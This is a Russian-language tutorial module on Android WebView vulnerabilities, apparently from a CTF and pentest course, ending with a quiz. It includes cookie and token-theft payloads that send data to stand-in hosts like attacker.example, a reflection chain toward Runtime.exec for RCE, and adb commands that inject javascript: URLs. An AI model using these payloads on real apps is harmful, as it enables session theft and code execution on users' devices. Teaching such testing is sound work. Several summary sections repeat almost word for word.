---
id: mobile-webview
title: "WebView: XSS, JS-интерфейсы и утечки через встроенный браузер"
category: mobile
parent: mobile-android-components
difficulty: hard
order: 3
tags: [android, webview, xss, javascript-interface, file-access, ssrf]
prerequisites: [mobile-android-anatomy, mobile-intents-deeplinks]
useful_for:
  - "CTF Mobile (XSS в WebView, доступ к флагу через JS-мост)"
  - "Bug bounty (утечка токенов через WebView)"
  - "Пентест мобильных приложений"
estimated_minutes: 14
summary: "Как Android WebView открывает сайты и локальные страницы, чем опасны addJavascriptInterface, setAllowFileAccess и file://, и как эксплуатировать XSS/загрузку произвольного URL в контексте приложения."
---
## Что такое WebView и почему это опасно

WebView — встроенный браузер внутри Android-приложения. Он умеет загружать веб-страницы, исполнять JavaScript и — что важно — обмениваться данными с нативным кодом через JS-интерфейсы (`addJavascriptInterface`). Если WebView загружает недоверенный контент или позволяет выполнить произвольный JS, последствия серьёзны: XSS, кража токенов, доступ к файлам, вызов нативных методов. WebView — одна из самых частых уязвимостей Android. Цель модуля — научиться их находить и эксплуатировать.

## Опасные настройки WebView

Ищите в коде:

- `setJavaScriptEnabled(true)` — без него XSS не сработает, с ним — опасно.
- `addJavascriptInterface(obj, "name")` — даёт JS доступ к Java-объекту.
- `setAllowFileAccess(true)` / `setAllowFileAccessFromFileURLs(true)` — чтение файлов.
- `setAllowUniversalAccessFromFileURLs(true)` — запросы с file://.
- `setWebContentsDebuggingEnabled(true)` — отладка через Chrome.
- `loadUrl(userInput)` — загрузка произвольного URL.

```bash
grep -rn 'addJavascriptInterface\|setJavaScriptEnabled\|loadUrl\|setAllowFile' app_java
```

## XSS через WebView

Если WebView загружает HTML с неэкранированным вводом, возможна XSS:

```javascript
// если addJavascriptInterface добавлен под именем "app"
app.method(...)   // вызов нативного метода из JS
```

Пример эксплуатации: если WebView загружает `javascript:alert(1)` (например, через deep link), вы получаете выполнение JS. Если есть JS-интерфейс, вы можете вызвать нативные методы.

## Утечка токенов

WebView часто хранит сессию. Через XSS можно украсть токен:

```javascript
fetch('https://attacker/?t=' + localStorage.getItem('token'))
```

Или прочитать cookies, если они доступны.

## addJavascriptInterface: RCE

Если через `addJavascriptInterface` доступен объект с опасными методами (например, `Runtime.exec`), можно достичь RCE:

```javascript
app.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...)
```

Даже если прямой доступ ограничен, рефлексия часто позволяет добраться до опасных вызовов.

## Загрузка произвольного URL

Если deep link или intent передаёт URL в WebView без проверки, можно:

- загрузить фишинговую страницу;
- загрузить `javascript:`-пейлоад;
- загрузить `file://` (если разрешено) и прочитать локальные файлы.

```bash
adb shell am start -a android.intent.action.VIEW -d "myapp://web?url=javascript:alert(1)"
```

## setWebContentsDebuggingEnabled

Если включена отладка, можно подключиться к WebView через Chrome DevTools:

```bash
adb forward tcp:9222 localabstract:webview_devtools_remote_<pid>
# открыть chrome://inspect
```

Это позволяет исследовать содержимое WebView вручную.

## Защита и её обход

Правильная защита: не включать JavaScript без нужды, не добавлять JS-интерфейсы, проверять URL по whitelist, экранировать вывод. Обход: ищите непроверенные параметры, `javascript:`-схему, доступ к нативным методам через рефлексию.

## Типичные ошибки и подводные камни

- **Игнорировать `addJavascriptInterface`** — это прямой мост в нативный код.
- **Забыть про `file://`** — чтение локальных файлов.
- **Не проверить deep link в WebView** — инъекция URL.
- **Полагать, что XSS в WebView безвреден** — он даёт доступ к нативным методам.
- **Не включить отладку** — теряете удобный инструмент.
- **Забыть про JS-мост** — именно он превращает XSS в RCE.

## Справочная таблица

| Настройка | Риск |
|-----------|------|
| `addJavascriptInterface` | JS→Java, возможен RCE |
| `setJavaScriptEnabled` | XSS |
| `setAllowFileAccess` | чтение файлов |
| `loadUrl(userInput)` | инъекция URL |
| `setWebContentsDebuggingEnabled` | отладка |

## Что дальше / решение

План: найдите WebView-код и опасные настройки, проверьте, откуда берётся URL/HTML, подставьте `javascript:` и внешний URL, проверьте доступные JS-интерфейсы и рефлексию. Если включена отладка — подключитесь через Chrome DevTools. WebView — частая и серьёзная уязвимость, потому что JS-мост связывает веб-контент с нативным кодом.

## Практический пример: XSS через WebView в RCE

Разберём сквозной сценарий. В коде находим `webView.addJavascriptInterface(new Bridge(), "bridge")` и `webView.loadUrl(getIntent().getStringExtra("url"))`. Шаг 1: понимаем, что URL берётся из intent — значит, можно передать произвольный. Шаг 2: запускаем: `adb shell am start -n com.example.app/.WebActivity -e "url" "javascript:bridge.getFlag()"`. Шаг 3: если метод возвращает флаг, он появится в UI или в логе. Шаг 4: если прямой доступ к опасным методам закрыт, используем рефлексию: `javascript:bridge.getClass().forName('java.lang.Runtime')...` — путь к RCE.

Ключевая мысль: `addJavascriptInterface` — это мост из веб-мира в нативный. Любая инъекция JS (через URL, HTML, редирект) превращается в вызов нативного кода. Даже «безобидный» интерфейс с одним методом может стать точкой входа.

## Практический пример: кража токена

Если WebView загружает страницу с XSS, можно украсть сессию:

```javascript
fetch('https://attacker.example/?t=' + btoa(document.cookie))
```

Или прочитать `localStorage`, где приложение хранит JWT. Это классическая утечка через WebView, которая на сервере выглядит как обычный запрос.

## Проверка настроек и отладки

Пройдитесь по коду и найдите все опасные флаги (`setAllowFileAccess`, `setAllowUniversalAccessFromFileURLs`, `setWebContentsDebuggingEnabled`). Если включена отладка — подключитесь через `adb forward` и `chrome://inspect`, чтобы увидеть содержимое WebView и выполнять JS вручную. Это самый быстрый способ понять, что загружается.

## Частые вопросы

«JS не выполняется?» — `setJavaScriptEnabled(false)` или CSP. «Не знаю имя JS-интерфейса?» — ищите `addJavascriptInterface` в коде. «URL не берётся из intent?» — ищите другие источники (`loadData`, редирект). «Как читать файлы?» — `file://` при `setAllowFileAccess`. «Что если CSP?» — ищите обход или другой вектор.

## Что дальше / решение

Итог: найдите WebView-код, опасные настройки и источники URL/HTML; подставьте `javascript:` и внешний URL; изучите JS-интерфейсы и рефлексию. Включите отладку для ручного анализа. WebView — частая и серьёзная уязвимость: JS-мост связывает веб-контент с нативным кодом, превращая XSS в кражу данных или RCE.

## Расширенный чек-лист по WebView

Порядок. Первое: найдите WebView-код и все опасные настройки (`addJavascriptInterface`, `setJavaScriptEnabled`, `setAllowFileAccess`, `setAllowUniversalAccessFromFileURLs`, `setWebContentsDebuggingEnabled`). Второе: определите, откуда берётся URL/HTML — из intent, deep link, сети, локального файла. Третье: если источник контролируемый — подставьте `javascript:alert(1)` и внешний URL. Четвёртое: изучите JS-интерфейсы — какие методы доступны и есть ли путь к рефлексии/RCE. Пятое: если включена отладка — подключитесь через `adb forward` и `chrome://inspect`. Шестое: проверьте `file://`-доступ и чтение локальных файлов. Седьмое: проверьте CSP и другие ограничения.

## Что делает WebView опасным

Сама по себе загрузка веб-страницы не опасна. Опасность возникает в комбинации: включённый JavaScript + контролируемый источник контента + JS-мост или доступ к файлам. Именно эта комбинация превращает «просто браузер» в вектор RCE и утечки данных. Поэтому при анализе ищите именно такие сочетания.

## Частые вопросы

«JS не исполняется?» — `setJavaScriptEnabled(false)` или CSP. «Не знаю имя моста?» — `addJavascriptInterface` в коде. «Как читать файлы?» — `file://` при `setAllowFileAccess`. «Нет отладки?» — включите через патч или используйте Frida. «URL не из intent?» — ищите `loadData`/редиректы.

## Что дальше / решение

Итог: WebView опасен комбинацией «JS + контролируемый контент + мост/файлы». Находите настройки, источники контента и JS-интерфейсы, подставляйте `javascript:` и внешние URL, используйте отладку. WebView — частая и серьёзная уязвимость Android, часто ведущая к краже токенов или RCE.

## Итог по WebView

Ищите комбинацию «JS + контролируемый контент + мост/файлы». Подставляйте `javascript:` и внешние URL, изучайте JS-интерфейсы, используйте отладку. WebView часто ведёт к краже токенов или RCE.

## Итог по WebView

Ключевое — комбинация «JS + контролируемый контент + мост/файлы». Проверьте настройки, источники и JS-интерфейсы; используйте отладку. WebView часто ведёт к краже токенов или RCE.

## Квиз

```quiz
- question: "Почему XSS в Android WebView опаснее обычного XSS в браузере?"
  options:
    - "Он даёт JS доступ к нативным функциям приложения через `addJavascriptInterface`"
    - "Он быстрее"
    - "Он не требует JavaScript"
    - "Он обходит HTTPS"
  answer: 0
- question: "Какой метод делает нативные методы доступными из JavaScript?"
  options:
    - "`setJavaScriptEnabled`"
    - "`loadUrl`"
    - "`addJavascriptInterface`"
    - "`shouldOverrideUrlLoading`"
  answer: 2
- question: "Что позволяет `setAllowFileAccess(true)` вместе с `file://`?"
  options:
    - "Читать локальные файлы приложения из веб-контекста"
    - "Ускорять загрузку"
    - "Включать HTTPS"
    - "Отключать JavaScript"
  answer: 0
- question: "Если WebView грузит URL из deep link без проверки домена — это…"
  options:
    - "Загрузка произвольного URL (фишинг, XSS, доступ к мосту)"
    - "Нормальное поведение"
    - "Защита от MITM"
    - "Обязательное требование Android"
  answer: 0
- question: "Каким хуком удобно логировать загрузку URL в WebView через Frida?"
  options:
    - "Перехватить `WebView.loadUrl`"
    - "Перехватить `Content-Type`"
    - "Перехватить `sqlite3`"
    - "Перехватить `ptrace`"
  answer: 0
```

## Где пригодится

- **CTF Mobile:** XSS в WebView → вызов JS-моста → флаг/токен.
- **Bug bounty:** кража сессий/токенов через WebView, утечка через `file://`, account takeover.
- **Пентест:** проверка OWASP MASVS-PLATFORM (WebView-безопасность).
- **Работа:** рекомендации по безопасной настройке WebView (отключить file access, валидировать домены, минимизировать мосты).
